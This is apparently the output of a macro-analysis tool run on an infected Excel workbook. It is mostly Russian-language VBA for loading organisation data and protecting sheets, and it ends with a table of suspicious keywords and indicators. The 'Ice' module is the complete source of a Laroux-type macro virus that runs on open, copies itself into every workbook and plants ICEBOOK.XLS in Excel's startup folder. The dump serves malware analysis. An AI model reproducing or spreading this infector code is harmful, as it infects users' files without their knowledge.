    Exit Sub
End If
    Otkl = False
    Application.ScreenUpdating = False
    Application.EnableEvents = False
    SVOD.LOAD_FILES          '----------!!!!!
    SVOD.NumStrok_from_MO
    WB_SV.Activate
    If Otkl = False Then
        WB_SV.Sheets(sh1).Activate
    Else
        WB_SV.Sheets("Ошибки загрузки").Activate ' если на лист "Ошибки загрузки" что-то попало! т.е. хотя бы один файл обработался с ошибками! то делаем этот лист Активным!
    End If
    Application.EnableEvents = True
    Application.ScreenUpdating = True
    Exit Sub
Err_Open_:
Application.EnableEvents = True
Application.ScreenUpdating = True
End Sub

' ДОБАВИТЬ ДАННЫЕ ИЗ ФАЙЛА
Private Sub Load1Cmd_Click()
Dim name_file As String
Dim Rezult As String

Dim NUM_ROW As Integer

Dim WB_SV As Workbook
Dim WB_AT As Workbook

Dim ws_rez As Worksheet

Set WB_SV = ThisWorkbook

' проверка на ввод РЕГИОНА
If Len(WB_SV.Sheets("Список организаций").Range("I10").Value) = 0 Or Len(WB_SV.Sheets("Список организаций").Range("K10").Value) = 0 Then
    WB_SV.Sheets("Список организаций").Activate
    WB_SV.Sheets("Список организаций").Range("I10").Select
    MsgBox "Перед началом загрузки необходимо выбрать МО и ОКТМО на листе 'Список организаций' !", vbCritical
    Exit Sub
End If

name_file = ActiveSheet.Range("H12").Value
Set ws_rez = WB_SV.Sheets("Ошибки загрузки")
ws_rez.Unprotect "aq1sw2de3"
ws_rez.Range("A2:C65000").ClearContents
NUM_ROW = 2
On Error GoTo Err_Open_
        If InStr(1, name_file, "\" & ThisWorkbook.name) > 0 Then
                ws_rez.cells(NUM_ROW, 1).Font.Size = 9
                ws_rez.cells(NUM_ROW, 1).Value = name_file
                ws_rez.cells(NUM_ROW, 2).Value = "Нельзя одновременно открыть 2 файла с одинаковыми именами!"
                WB_SV.Activate
                ws_rez.Activate
                ws_rez.Range("A" & NUM_ROW & ":C" & NUM_ROW).Select
                ws_rez.Protect DrawingObjects:=False, Password:="aq1sw2de3", AllowFormattingColumns:=True, AllowFormattingRows:=True
                Exit Sub
        End If
        Application.ScreenUpdating = False
        Application.EnableEvents = False
        Workbooks.Open FileName:=name_file, UpdateLinks:=0 ' ОТКРЫТИЕ АТОМАРНОГО ФАЙЛА
        Application.EnableEvents = True
        
        Set WB_AT = ActiveWorkbook
                
        Propusk = "Спрашивать"
        Rezult = load.load_1(WB_SV, WB_AT) ' ДОБАВИТЬ-СКОРРЕКТИРОВАТЬ
        
        SVOD.NumStrok_from_MO  ' ДОБАВИТЬ-СКОРРЕКТИРОВАТЬ
        
        SVOD.AddHypRez WB_AT, WB_SV, Rezult, NUM_ROW
        
        WB_SV.Activate
        
        Application.ScreenUpdating = True
        Application.EnableEvents = True
        Exit Sub
Err_Open_:
        Application.EnableEvents = True
        MsgBox "Произошла ошибка открытия! Проверьте наличие файла '" & name_file & "'!", vbCritical ' ПРОВЕРКА НА КОРРЕКТОНОСТЬ ОТКРЫТИЯ ФАЙЛА ---
        ActiveSheet.Range("G12").Select
        Exit Sub
End Sub

' ФОРМИРОВАНИЕ СПИСКА ФАЙЛОВ УКАЗАННОЙ ПАПКИ
Private Sub PoiskCmd_Click()
        If SVOD.SpisokFiles(Sheets("Свод").Range("H10")) = True Then
        End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист14.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ОТКРЫТЬ ФАЙЛ ДЛЯ ПРОСМОТРА
Private Sub Worksheet_FollowHyperlink(ByVal Target As Hyperlink)
Dim name_file As String

name_file = Target.Range.cells(1, 1).Value

On Error GoTo Err_Open_
        Application.EnableEvents = False
        Workbooks.Open FileName:=name_file, UpdateLinks:=0
        Application.EnableEvents = True
        Exit Sub
Err_Open_:
        Application.EnableEvents = True
        MsgBox "Произошла ошибка открытия! Проверьте наличие файла '" & name_file & "'!", vbCritical
        Target.Range.cells(1, 1).Select
        Exit Sub

End Sub
-------------------------------------------------------------------------------
VBA MACRO FormPropusk.frm 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/FormPropusk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CmdProp_Click()
Propusk = "Пропускать"
Unload FormPropusk
End Sub

Private Sub CmdSpr_Click()
Propusk = "Спрашивать"
Unload FormPropusk
End Sub

Private Sub CmdZam_Click()
Propusk = "Заменять"
Unload FormPropusk
End Sub

Private Sub Label1_Click()

End Sub

Private Sub UserForm_Click()

End Sub
' определяем сообщение
Private Sub UserForm_Initialize()
Propusk = "Не определено"
Label1.caption = "При полном совпадении реквизитов орагнизаций из обратываемого шаблона с реквизитами организаций уже присутствующими в данном шаблоне, перегружать данные об организациях в данный шаблон?"
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
If Propusk = "Не определено" Then
    Cancel = True
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Help_dopoln.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Help_dopoln'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ЗАЩИТА ячеек на листе
Sub ProtectCells()
Dim i As Integer
Dim rg1 As Range
Dim w1 As Worksheet
Dim Col_index1 As Long
Dim Col_index2 As Long
Dim Col_index3 As Long

Col_index1 = 36
Col_index2 = 34
Col_index3 = 3
 ActiveSheet.Unprotect ("aq1sw2de3")

    ActiveSheet.cells.Select
'    Selection.Font.name = "Tahoma"
'    With Selection
'        .VerticalAlignment = xlCenter
'        .WrapText = True
'    End With
    
    Selection.Locked = True
    
    For Each rg1 In ActiveSheet.Range(ActiveSheet.Range("A1"), ActiveCell.SpecialCells(xlLastCell))
        If rg1.Interior.ColorIndex = Col_index1 Or rg1.Interior.ColorIndex = Col_index2 Or rg1.Interior.ColorIndex = Col_index3 Then   'Or rg1.Interior.ColorIndex = Col_index2
            rg1.Select
            Selection.Locked = False
        End If
    Next
    
ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

End Sub
' Диапазаоны
Sub ProtectCells1()
Dim i As Integer
Dim rg1 As Range
Dim w1 As Worksheet
Dim Col_index1 As Long
Dim Col_index2 As Long
Dim Col_index3 As Long
'MsgBox ActiveSheet.Range("E9").Interior.ColorIndex  '35 - ???????
'MsgBox ActiveSheet.Range("F27").Interior.ColorIndex '40 - ?????
'MsgBox ActiveSheet.Range("F11").Interior.ColorIndex '36 - ??????
'MsgBox ActiveSheet.Range("F11").Interior.ColorIndex '34 - ???????

Col_index1 = 36
Col_index2 = 34
Col_index3 = 3
 ActiveSheet.Unprotect ("aq1sw2de3")

    ActiveSheet.cells.Select
    Selection.Font.name = "Arial"
    With Selection
        .VerticalAlignment = xlCenter
        .WrapText = True
        .Orientation = 0
        .AddIndent = False
        .ReadingOrder = xlContext
    End With
    Selection.Locked = True
    For Each rg1 In ActiveSheet.Range("A1:AA400").cells
        If rg1.Interior.ColorIndex = Col_index1 Or rg1.Interior.ColorIndex = Col_index2 Or rg1.Interior.ColorIndex = Col_index3 Then   'Or rg1.Interior.ColorIndex = Col_index2
            rg1.Select
            Selection.Locked = False
        End If
    Next
'    ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

End Sub

Sub s()
Application.EnableEvents = True
Application.ScreenUpdating = True

End Sub


Sub НУМЕРАЦИЯ()
Dim r  As Range

For Each r In Selection.cells
'Debug.Print Mid(R.FormulaR1C1, 1, 1)
'Debug.Print R.FormulaR1C1




    If Len(r.FormulaR1C1) > 0 Then
       r.FormulaR1C1 = "S" & r.FormulaR1C1
       
    End If
Next

End Sub


Sub НУМЕРАЦИЯ1()
Dim r  As Range

For Each r In Selection.cells
    If Len(r.Value) > 0 Then
       r.Value = "'11" & Mid(r.Value, 3, Len(r.Value))
    End If
Next

End Sub
Sub procent()
Dim r  As Range

For Each r In Selection.cells
      r.FormulaR1C1 = r.FormulaR1C1 & "/100"
Next

End Sub
' удаляет все, разрешенные для изменения диапазоны со всех листов
Sub EditRanges()
Dim w As Worksheet
Dim EdR As AllowEditRange
Dim k As Integer
Set w = ActiveSheet

For Each w In ActiveWorkbook.Sheets
    On Error Resume Next
    w.Unprotect "aq1sw2de3"
    For Each EdR In w.Protection.AllowEditRanges
        EdR.Delete
    Next
    'w.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
Next

End Sub
' отобразить все листы кроме технических
Sub VisibleAllheets()
Dim ws As Worksheet
For Each ws In ActiveWorkbook.Sheets
    If ws.name <> "23" And ws.name <> "Заголовок" And ws.name <> "Заголовок2" Then
        'Debug.Print ws.name
        ws.Visible = True
    End If
Next
End Sub

'УДАЛЕНИЕ ВСЕХ ИМЕНОВАННЫХ ДИАПАЗОНОВ
Sub DelNameDiap()

Dim r As name
Dim i As Long

i = 1
    For Each r In ActiveWorkbook.Names
    'If InStr(1, R.NameLocal, "dd1") > 0 Then
        r.Delete
'       Sheets("Лист5").cells(i, 1).Value = R.Value
'       Sheets("Лист5").cells(i, 2).Value = R.NameLocal
       ' i = i + 1
'       End If
    Next
End Sub
' снять защиту со всех ВИДИМЫХ листов кроме технических
Sub UnProtectAllVisibleheets()
Dim ws As Worksheet
For Each ws In ActiveWorkbook.Sheets
    If ws.name <> "23" And ws.name <> "Заголовок" And ws.name <> "Заголовок2" And ws.name <> "Инструкция" And ws.Visible = True Then
        ws.Unprotect "aq1sw2de3"
'           ws.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
    End If
Next
End Sub
' везде установить Tahoma
Sub AllTahoma()
Dim ws As Worksheet
For Each ws In ActiveWorkbook.Sheets
    If ws.name <> "23" And ws.name <> "Заголовок" And ws.name <> "Заголовок2" And ws.name <> "Инструкция" Then
        ws.Activate
        ws.Unprotect ("aq1sw2de3")
        ws.cells.Select
        Selection.Font.name = "Tahoma"
    End If
Next
End Sub

Sub а()
Application.EnableEvents = True
End Sub
' ПРИНАДЛЕЖИТ ЛИ ЭЛЕМЕНТ ДИАПАЗОНУ
Function PrinadlDiapazon(rg As Range, ELEMENT As String) As Boolean

Dim cl As Range

PrinadlDiapazon = False
For Each cl In rg
    If cl.Value = ELEMENT Then
        PrinadlDiapazon = True
        Exit Function
    End If
Next

End Function

Sub itog_sheets()

Dim i As Integer
Dim rg1 As Range
Dim w1 As Worksheet
Dim Col_index1 As Long
Dim Col_index2 As Long
'MsgBox ActiveSheet.Range("E9").Interior.ColorIndex  '35 - зеленый
'MsgBox ActiveSheet.Range("F27").Interior.ColorIndex '40 - рыжий
'MsgBox ActiveSheet.Range("F11").Interior.ColorIndex '36 - желтый

Col_index1 = 35
'Col_index2 = 36
 ActiveSheet.Unprotect ("aq1sw2de3")

    'ActiveSheet.cells.Select
    'Selection.Font.name = "Times New Roman"
    'Selection.Locked = True
        For Each rg1 In Selection.cells
            If rg1.Interior.ColorIndex = 35 Then 'Or rg1.Interior.ColorIndex = Col_index2
                
                rg1.FormulaR1C1 = "=КУ1!RC+КУ2!RC+КУ3!RC+КУ4!RC+КУ5!RC+КУ6!RC+КУ7!RC+КУ8!RC+КУ9!RC+КУ10!RC"
            End If
        Next

    
    ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

End Sub







-------------------------------------------------------------------------------
VBA MACRO Ice.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Ice'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Ice-LC's work! Do you like it?
' 25 Jan 1999. С днём студента!
' Bonne voyage!

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
  Application.OnWindow = "ice_action"
End Sub

Sub ice_action()
Attribute ice_action.VB_Description = "0"
Attribute ice_action.VB_ProcData.VB_Invoke_Func = " \n14"
  Dim c As String, ab As String, newname As String
  Dim ib As Integer, wb As Integer, i As Integer
  
  On Error Resume Next
    
  c$ = Application.StartupPath
  If Dir(c$ & "\" & "ICEBOOK.XLS") = "ICEBOOK.XLS" Then ib = 1 Else ib = 0
  wb = 0
  For i = ActiveWorkbook.Modules.Count To 1 Step -1
    If ActiveWorkbook.Modules(i).name = "Ice" Then
      wb = 2
      Exit For
    End If
  Next i
    
  ab$ = ActiveWorkbook.name
  Select Case ib + wb
    Case 1
      Application.ScreenUpdating = False
      Workbooks("ICEBOOK.XLS").Sheets("Ice").Copy before:= _
          Workbooks(ab$).Sheets(1)
      Workbooks(ab$).Sheets("Ice").Visible = False
      Application.ScreenUpdating = True
    Case 2
      Application.ScreenUpdating = False
      Sheets("Ice").Visible = True
      Sheets("Ice").Copy
      With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
      End With
      newname$ = ActiveWorkbook.name
      ActiveWindow.Visible = False
      err = 0
      Workbooks(newname$).SaveAs FileName:=c$ & "\" & _
          "ICEBOOK.XLS", FileFormat:=xlNormal, Password:="", _
          WriteResPassword:="", ReadOnlyRecommended:=False, _
          CreateBackup:=False
      If err = 0 Then Application.OnWindow = "icebook.xls!ice_action"
      Sheets("Ice").Visible = False
      Application.ScreenUpdating = True
  End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  2
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Ic
' 0085     28 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - =AB@
' 0085     44 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - !?8A>:  >@
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 0;
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - !<
' 0085     30 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ><<5
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - @>2
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - !2
' 0085     38 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 
H81:8  
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - 80?
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  TEHSHEE
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  REEST
' 0085     28 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - 03>;
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden - 03>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormReestr/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Label1
-------------------------------------------------------------------------------
VBA FORM Variable "b'LOrg'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'inn'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'LInn'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OK'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Cancel'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'org'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'vprod'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'pr_fil'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'LFil'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'fil'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'kpp'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'LKpp'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'od'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Lnds'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'nds'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdZam'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormPropusk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdProp'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormPropusk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdSpr'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormPropusk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormPropusk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComOK'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormReestr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComOTSUT'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormReestr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormReestr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListReestr'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormReestr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormRegion'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComOK'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormRegion'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComCancel'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormRegion'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboRegion'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormRegion'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSExcel.Laroux.of.xls' - OLE stream: '_VBA_PROJECT_CUR/FormRegion'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|AutoExec  |ComCancel_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |nds_Change          |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |Worksheet_FollowHype|Runs when the file is opened and ActiveX     |
|          |rlink               |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |3.2.1.1             |IPv4 address                                 |
|IOC       |3.2.1.2             |IPv4 address                                 |
|IOC       |3.2.2.1             |IPv4 address                                 |
|IOC       |3.2.2.2             |IPv4 address                                 |
|IOC       |3.2.3.1             |IPv4 address                                 |
|IOC       |3.2.3.2             |IPv4 address                                 |
|IOC       |3.2.4.1             |IPv4 address                                 |
|IOC       |3.2.4.2             |IPv4 address                                 |
|IOC       |3.2.5.1             |IPv4 address                                 |
|IOC       |3.2.5.2             |IPv4 address                                 |
|IOC       |3.2.6.1             |IPv4 address                                 |
|Hex String|(7P                 |2837500C                                     |
|Hex String||ksc                |7C6B7363                                     |
+----------+--------------------+---------------------------------------------+

